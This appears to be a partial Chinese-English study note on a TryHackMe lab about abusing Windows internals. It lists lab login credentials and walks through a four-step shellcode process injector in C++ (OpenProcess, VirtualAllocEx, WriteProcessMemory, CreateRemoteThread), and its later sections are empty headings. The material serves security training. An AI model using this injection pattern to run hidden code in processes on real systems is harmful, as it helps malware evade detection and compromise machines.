# Abusing Windows Internals

> [TryHackMe | Abusing Windows Internals](https://tryhackme.com/room/abusingwindowsinternals)
>
> Updated in 2023-12-30
>
> 利用 Windows 内部组件来规避常见的检测解决方案，采用现代的与工具无关的方法。
>
> Leverage windows internals components to evade common detection solutions, using modern tool-agnostic approaches.

## Introduction - 介绍

Windows 内部结构是 Windows 操作系统运行的核心，这为恶意使用者提供了一个利润丰厚的目标。Windows 内部结构可用于隐藏和执行代码、规避检测，并与其他技术或漏洞链相结合。

Windows 内部结构这一术语可以包含 Windows 操作系统后端的任何组件。这可能包括进程、文件格式、COM（组件对象模型）、任务调度、I/O 系统等。本次讨论将侧重于滥用和利用进程及其组件、动态链接库（DLL）和 PE（可移植可执行）格式。

### 学习目标

- 了解内部组件的易受攻击性
- 学习如何滥用和利用 Windows 内部结构的漏洞
- 了解技术的缓解和检测方法
- 将所学技术应用于真实世界的对手案例研究

在开始本教程前，请熟悉基本的 Windows 使用和功能。我们建议完成 Windows 内部结构教程。同时，基本的 C++ 和 PowerShell 编程知识也是推荐的，但不是必需的。

我们提供了一个基础的 Windows 机器，并提供了完成此教程所需的文件。您可以通过浏览器或使用以下凭据通过 RDP 访问该机器。

```plaintext
Machine IP: 10.10.180.10
Username: THM-Attacker
Password: Tryhackme!
```

这将是大量信息。请系好安全带，并找到最近的灭火器。

离开时别忘了向蓝队提供小费！

## Abusing Processes - 滥用进程

您操作系统上运行的应用程序可能包含一个或多个进程。进程维护和表示正在执行的程序。

进程具有许多其他子组件，并直接与内存或虚拟内存交互，使其成为一个完美的攻击目标。下表描述了进程的每个关键组件及其目的。

|     进程组件     |                     目的                     |
| :--------------: | :------------------------------------------: |
| 私有虚拟地址空间 |           进程被分配的虚拟内存地址           |
|    可执行程序    |     定义存储在虚拟地址空间中的代码和数据     |
|     打开句柄     |         定义进程可访问的系统资源句柄         |
|    安全上下文    | 访问令牌定义用户、安全组、特权和其他安全信息 |
|     进程 ID      |             进程的唯一数字标识符             |
|       线程       |            进程中被调度执行的部分            |

有关进程的更多信息，请查看 `Windows Internals`

进程注入通常被用作一个总称，用来描述通过合法功能或组件向进程中注入恶意代码。在本教程中，我们将重点关注以下四种不同类型的进程注入。

|                                                注入类型                                                |                    功能                    |
| :----------------------------------------------------------------------------------------------------: | :----------------------------------------: |
|            [进程空壳化 - Process Hollowing](https://attack.mitre.org/techniques/T1055/012/)            | 将代码注入到一个挂起并 “空壳化” 的目标进程中 |
|      [线程执行劫持 - Thread Execution Hijacking](https://attack.mitre.org/techniques/T1055/003/)       |      将代码注入到一个挂起的目标线程中      |
|   [动态链接库注入 - Dynamic-link Library Injection](https://attack.mitre.org/techniques/T1055/001/)    |          向进程内存中注入一个 DLL          |
| [可移植可执行文件注入 - Portable Executable Injection](https://attack.mitre.org/techniques/T1055/002/) | 自我注入 PE 图像，指向目标进程中的恶意函数 |

有许多其他形式的进程注入，由 [MITRE T1055](https://attack.mitre.org/techniques/T1055/) 概述。

在最基本的层面上，进程注入采取 shellcode 注入的形式。

在较高层次上，shellcode 注入可以分为四个步骤：

1. 使用所有访问权限打开目标进程。
2. 为 shellcode 分配目标进程的内存空间。
3. 将 shellcode 写入目标进程中已分配的内存。
4. 使用远程线程执行 shellcode。

这些步骤也可以通过图形方式进行分解，以描述 Windows API 调用如何与进程内存交互。

![Windows API 与内存进行交互](img/image_20231222-202240.png)

我们将拆解一个基本的 shellcode 注入器，以识别每个步骤，并在下面更深入地解释。

在 shellcode 注入的第一步中，我们需要使用特殊参数打开目标进程。`OpenProcess` 用于打开通过命令行提供的目标进程。

```cpp
processHandle = OpenProcess(
    PROCESS_ALL_ACCESS, // Defines access rights
    FALSE, // Target handle will not be inhereted
    DWORD(atoi(argv[1])) // Local process supplied by command-line arguments
);
```

在第二步中，我们必须为 shellcode 的字节大小分配内存。内存分配使用 `VirtualAllocEx` 处理。在调用中，`dwSize` 参数使用 `sizeof` 函数定义，以获取要分配的 shellcode 字节数。

```cpp
remoteBuffer = VirtualAllocEx(
    processHandle, // Opened target process
    NULL,
    sizeof shellcode, // Region size of memory allocation
    (MEM_RESERVE | MEM_COMMIT), // Reserves and commits pages
    PAGE_EXECUTE_READWRITE // Enables execution and read/write access to the commited pages
);
```

在第三步，现在我们可以使用已分配的内存区域来写入我们的 shellcode。通常使用 `WriteProcessMemory` 来写入内存区域。

```cpp
WriteProcessMemory(
    processHandle, // Opened target process
    remoteBuffer, // Allocated memory region
    shellcode, // Data to write
    sizeof shellcode, // byte size of data
    NULL
);
```

在第四步，我们现在控制了进程，并且我们的恶意代码已经写入内存。为了执行驻留在内存中的 shellcode，我们可以使用 `CreateRemoteThread` ；线程控制着进程的执行。

```cpp
remoteThread = CreateRemoteThread(
    processHandle, // Opened target process
    NULL, 
    0, // Default size of the stack
    (LPTHREAD_START_ROUTINE)remoteBuffer, // Pointer to the starting address of the thread
    NULL, 
    0, // Ran immediately after creation
    NULL
);
```

## Expanding Process Abuse - 扩展进程滥用

## Abusing Process Components - 滥用进程组件

## Abusing DLLs - 滥用动态链接库（DLL）

## Memory Execution Alternatives - 内存执行替代方案

## Case Study in Browser Injection and Hooking - 浏览器注入和挂钩的案例研究

## Conclusion - 结论
